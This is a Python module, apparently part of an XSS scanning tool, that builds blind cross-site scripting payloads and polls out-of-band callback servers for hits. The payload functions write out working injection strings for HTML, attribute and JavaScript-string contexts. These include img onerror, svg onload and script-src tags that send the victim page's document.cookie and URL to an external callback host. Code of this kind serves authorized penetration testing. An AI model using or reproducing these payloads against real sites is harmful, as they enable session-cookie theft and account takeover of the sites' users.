"""Blind XSS detection module.

Architecture:
  - Each injection point gets a unique UUID token embedded in OOB payloads.
  - A token manifest (blind_tokens.json next to the report) maps token → injection.
  - Payloads fire a callback to a user-supplied URL: --blind-callback https://...
  - Post-scan, axss prints a poll reminder; --poll-blind can re-check later.
  - No infrastructure required on our end — user supplies their OOB endpoint.

Payload delivery surfaces covered:
  - HTML context     : <script src>, <img onerror>, <svg onload>
  - Attribute context: event-handler breakout, href=javascript:
  - JS string context: fetch(), new Image().src, XHR
  - CSP-hostile      : multiple fallbacks so at least one fires under common CSPs

Token format: axss_XXXXXXXXXXXXXXXX (16 hex chars, unique per injection point)
Callback URL: {callback}?t={token}&u={encoded_origin_url}&c={encoded_cookies}
"""
from __future__ import annotations

import json
import logging
import os
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import requests

log = logging.getLogger(__name__)

_TOKEN_PREFIX = "axss_"
_MANIFEST_FILENAME = "blind_tokens.json"


# ---------------------------------------------------------------------------
# Token + manifest
# ---------------------------------------------------------------------------

def make_token() -> str:
    """Generate a unique blind XSS token."""
    return _TOKEN_PREFIX + uuid.uuid4().hex[:16]


@dataclass
class BlindToken:
    """Records one blind XSS injection attempt."""
    token: str
    url: str            # injection target URL
    param: str          # injected parameter name
    delivery: str       # "get" | "post"
    context_type: str   # best-guess context at time of injection
    callback_url: str   # the OOB endpoint we embedded in the payload
    timestamp: float = field(default_factory=time.time)
    confirmed: bool = False
    confirmed_at: float = 0.0


class BlindTokenManifest:
    """Persists the token → injection mapping to a JSON file."""

    def __init__(self, path: str | Path) -> None:
        self.path = Path(path)
        self._tokens: dict[str, dict] = {}
        if self.path.exists():
            try:
                self._tokens = json.loads(self.path.read_text(encoding="utf-8"))
            except Exception:
                self._tokens = {}

    def record(self, token_obj: BlindToken) -> None:
        self._tokens[token_obj.token] = {
            "url": token_obj.url,
            "param": token_obj.param,
            "delivery": token_obj.delivery,
            "context_type": token_obj.context_type,
            "callback_url": token_obj.callback_url,
            "timestamp": token_obj.timestamp,
            "confirmed": token_obj.confirmed,
        }
        self._save()

    def mark_confirmed(self, token: str) -> None:
        if token in self._tokens:
            self._tokens[token]["confirmed"] = True
            self._tokens[token]["confirmed_at"] = time.time()
            self._save()

    def all_tokens(self) -> list[str]:
        return list(self._tokens.keys())

    def unconfirmed(self) -> list[tuple[str, dict]]:
        return [(t, d) for t, d in self._tokens.items() if not d.get("confirmed")]

    def _save(self) -> None:
        try:
            self.path.write_text(
                json.dumps(self._tokens, indent=2),
                encoding="utf-8",
            )
        except Exception as exc:
            log.debug("BlindTokenManifest: save failed: %s", exc)


# ---------------------------------------------------------------------------
# Payload generation
# ---------------------------------------------------------------------------

def build_blind_payloads(token: str, callback_url: str) -> list[str]:
    """Return a set of blind XSS payloads embedding *token* and *callback_url*.

    Covers multiple delivery contexts so at least one fires regardless of
    where the data ends up being rendered.

    The callback encodes origin URL and cookies for identification:
      {callback}?t={token}&u="+location.href+"&c="+document.cookie
    """
    cb = callback_url.rstrip("/")
    t = token

    # Shared callback JS snippet (works in all JS-context payloads)
    _js_fetch = (
        f"fetch('{cb}?t={t}&u='+encodeURIComponent(location.href)"
        f"+'&c='+encodeURIComponent(document.cookie))"
    )
    _img_oob = f"new Image().src='{cb}?t={t}&u='+location.href+'&c='+document.cookie"

    return [
        # ── HTML injection: script src (fires even under many CSPs) ──────────
        f'<script src="{cb}?t={t}"></script>',

        # ── HTML injection: img onerror ──────────────────────────────────────
        f'<img src=x onerror="{_img_oob}">',

        # ── HTML injection: svg onload ───────────────────────────────────────
        f'<svg onload="{_img_oob}">',

        # ── HTML injection: details ontoggle ─────────────────────────────────
        f'<details open ontoggle="{_img_oob}">',

        # ── Attribute breakout: close attr + inject event handler ────────────
        f'"><img src=x onerror="{_img_oob}">',
        f"'><img src=x onerror=\"{_img_oob}\">",

        # ── Attribute breakout: href javascript: ─────────────────────────────
        f"javascript:eval('{_img_oob}')",

        # ── JS string context: breakout + fetch ──────────────────────────────
        f"';{_js_fetch};//",
        f'";{_js_fetch};//',

        # ── JS string context: template literal ──────────────────────────────
        f"`}};{_js_fetch};//",

        # ── Fallback: XHR (no fetch available) ───────────────────────────────
        (
            f'<img src=x onerror="var x=new XMLHttpRequest();'
            f"x.open('GET','{cb}?t={t}&u='+location.href);x.send()\">"
        ),
    ]


def blind_payloads_for_context(token: str, callback_url: str, context_type: str) -> list[str]:
    """Return the most relevant blind payloads for a specific injection context.

    Prioritises payloads that are likely to work for the given context type,
    followed by broad-spectrum fallbacks.
    """
    all_p = build_blind_payloads(token, callback_url)
    cb = callback_url.rstrip("/")
    t = token
    _img_oob = f"new Image().src='{cb}?t={t}&u='+location.href+'&c='+document.cookie"

    ctx = (context_type or "").lower()

    if "js" in ctx or "script" in ctx:
        # Pure JS context — fetch/img first, then HTML injection as fallback
        return [
            f"';{_img_oob};//",
            f'";{_img_oob};//',
            f"`}};{_img_oob};//",
        ] + all_p

    if "attr" in ctx:
        return [
            f'"><img src=x onerror="{_img_oob}">',
            f"'><img src=x onerror=\"{_img_oob}\">",
            f'"><script src="{cb}?t={t}"></script>',
        ] + all_p

    # Default: HTML context — start with broadest HTML vectors
    return all_p


# ---------------------------------------------------------------------------
# Post-scan polling
# ---------------------------------------------------------------------------

def poll_blind_callback(callback_url: str, tokens: list[str], timeout: int = 10) -> list[str]:
    """Poll *callback_url* for any tokens that have fired.

    This only works if the callback endpoint supports a /results or /poll API.
    Supports Interactsh-style endpoints: GET /poll?token={t} → 200 if fired.

    Returns a list of confirmed tokens.
    """
    confirmed: list[str] = []
    base = callback_url.rstrip("/")

    for token in tokens:
        try:
            resp = requests.get(
                f"{base}/poll",
                params={"t": token},
                timeout=timeout,
            )
            if resp.status_code == 200:
                confirmed.append(token)
        except Exception as exc:
            log.debug("blind poll error for token %s: %s", token, exc)

    return confirmed


def interactsh_poll(server: str, token: str, timeout: int = 10) -> list[dict]:
    """Poll an Interactsh server for interactions matching *token*.

    Returns a list of interaction dicts (may be empty).
    Compatible with Interactsh v1 API: GET /poll?id={token}&secret={token}
    """
    try:
        resp = requests.get(
            f"{server.rstrip('/')}/poll",
            params={"id": token, "secret": token},
            timeout=timeout,
        )
        if resp.status_code == 200:
            data = resp.json()
            return data.get("data", []) or []
    except Exception as exc:
        log.debug("interactsh poll error: %s", exc)
    return []
